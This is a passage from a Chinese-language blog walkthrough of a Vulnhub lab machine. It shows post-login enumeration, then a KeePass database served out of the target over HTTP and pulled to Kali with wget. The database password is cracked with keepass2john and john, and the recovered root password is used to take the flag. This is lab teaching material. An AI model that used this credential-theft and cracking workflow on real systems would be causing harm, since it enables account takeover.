</span></span><span class=line><span class=cl>raphael@grotesque:/var/www/html/lyricsblog$ <span class=nb>cd</span> /
</span></span><span class=line><span class=cl><span class=nb>cd</span> /
</span></span><span class=line><span class=cl>raphael@grotesque:/$ id
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>raphael<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>raphael<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>raphael<span class=o>)</span>
</span></span><span class=line><span class=cl>raphael@grotesque:/$ uname -a
</span></span><span class=line><span class=cl>uname -a
</span></span><span class=line><span class=cl>Linux grotesque 4.19.0-13-amd64 <span class=c1>#1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux</span>
</span></span><span class=line><span class=cl>raphael@grotesque:/$ sudo -l
</span></span><span class=line><span class=cl>sudo -l
</span></span><span class=line><span class=cl>bash: sudo: <span class=nb>command</span> not found
</span></span><span class=line><span class=cl>raphael@grotesque:/$
</span></span></code></pre></div><p>登录成功，查看系统内核信息和用户权限，发现无法通过这两项提权</p><p>那就先拿个flag，在<code>/home/raphael</code>
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116223221.png alt=image.png>
该目录下同时发现，<code>.kdbx</code>文件，该文件是keepass密码管理器的数据库，内容加密</p><p>靶机开启HTTP服务</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -m http.server <span class=m>9861</span>
</span></span></code></pre></div><p>将<code>.chadroot.kdbx</code>文件下载到kali中解密</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# wget http://10.9.23.155:9861/.chadroot.kdbx
</span></span><span class=line><span class=cl>--2024-01-16 22:50:11--  http://10.9.23.155:9861/.chadroot.kdbx
</span></span><span class=line><span class=cl>Connecting to 10.9.23.155:9861... connected.
</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Length: <span class=m>2174</span> <span class=o>(</span>2.1K<span class=o>)</span> <span class=o>[</span>application/octet-stream<span class=o>]</span>
</span></span><span class=line><span class=cl>Saving to: ‘.chadroot.kdbx’
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>.chadroot.kdbx                   100%<span class=o>[=======================================================</span>&gt;<span class=o>]</span>   2.12K  --.-KB/s    in 0.002s  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2024-01-16 22:50:12 <span class=o>(</span><span class=m>961</span> KB/s<span class=o>)</span> - ‘.chadroot.kdbx’ saved <span class=o>[</span>2174/2174<span class=o>]</span>
</span></span></code></pre></div><p>使用 keepass2john 和 john 破解该数据库的密码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# keepass2john .chadroot.kdbx <span class=p>|</span> tee <span class=nb>hash</span>
</span></span><span class=line><span class=cl>.chadroot:<span class=nv>$keepass$*</span>2*60000*0*d34ff0b3bbce285d4553b994d1377a942145c2066611eeec2b4de8359f92d18c*e1ae12738ee79dabedfaf7f387275bfb4afc77b6943d02c156eabfaac3c2e58b*638b2e50ed9f0e910f7a96dbeb990c6d*4779254b4e0535bbfa31cf2d31a8ef86033ddbc13be2a5b25e9b0b5983448681*d32ea132be90e65089bfb5c7b6fee69019ada50b62d2e11c6d77d92f2856ba1c
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# john <span class=nb>hash</span> --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>KeePass <span class=o>[</span>SHA256 AES 32/64<span class=o>])</span>
</span></span><span class=line><span class=cl>Cost <span class=m>1</span> <span class=o>(</span>iteration count<span class=o>)</span> is <span class=m>60000</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Cost <span class=m>2</span> <span class=o>(</span>version<span class=o>)</span> is <span class=m>2</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Cost <span class=m>3</span> <span class=o>(</span>algorithm <span class=o>[</span><span class=nv>0</span><span class=o>=</span>AES <span class=nv>1</span><span class=o>=</span>TwoFish <span class=nv>2</span><span class=o>=</span>ChaCha<span class=o>])</span> is <span class=m>0</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Will run <span class=m>4</span> OpenMP threads
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>chatter          <span class=o>(</span>.chadroot<span class=o>)</span>     
</span></span><span class=line><span class=cl>1g 0:00:03:21 DONE <span class=o>(</span>2024-01-16 23:04<span class=o>)</span> 0.004961g/s 133.8p/s 133.8c/s 133.8C/s colombiano..candyapple
</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span></code></pre></div><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116230500.png alt=image.png></p><p>使用<a href=https://app.keeweb.info/>https://app.keeweb.info/</a>网站在线查看密码数据库，使用第三个密码</p><p>得到root用户和密码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>用户：root
</span></span><span class=line><span class=cl>密码：.:.subjective.:.
</span></span></code></pre></div><p>登录root用户，提权成功</p><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116231234.png alt=image.png></p><p>夺旗flag</p><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240117085313.png alt=image.png></p></div><div class=post_footer><div class=meta><div class=info><span class="field tags"><i class=ri-stack-line></i>
<a href=https://linksecho.github.io/tags/vulnhub/>Vulnhub</a></span></div></div></div></div><div class=doc_comments></div></div></div></div><a id=back_to_top href=# class=back_to_top><i class=ri-arrow-up-s-line></i></a><footer class=footer><div class=powered_by><a href=https://varkai.com>Designed by VarKai,</a>
<a href=http://www.gohugo.io/>Proudly published with Hugo</a></div><div class=footer_slogan><span>循此苦旅，以达星辰</span></div></footer><script src=https://linksecho.github.io/js/jquery-3.5.1.min.js></script><link href=https://linksecho.github.io/css/fancybox.min.css rel=stylesheet><script src=https://linksecho.github.io/js/fancybox.min.js></script><script src=https://linksecho.github.io/js/zozo.js></script><script type=text/javascript async src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML">MathJax.Hub.Config({tex2jax:{inlineMath:[["$","$"],["\\(","\\)"]],displayMath:[["$$","$$"],["[[","]]"]],processEscapes:!0,processEnvironments:!0,skipTags:["script","noscript","style","textarea","pre"],TeX:{equationNumbers:{autoNumber:"AMS"},extensions:["AMSmath.js","AMSsymbols.js"]}}}),MathJax.Hub.Queue(function(){var e,t=MathJax.Hub.getAllJax();for(e=0;e<t.length;e+=1)t[e].SourceElement().parentNode.className+=" has-jax"})</script><style>code.has-jax{font:inherit;font-size:100%;background:inherit;border:inherit;color:#515151}</style></body></html>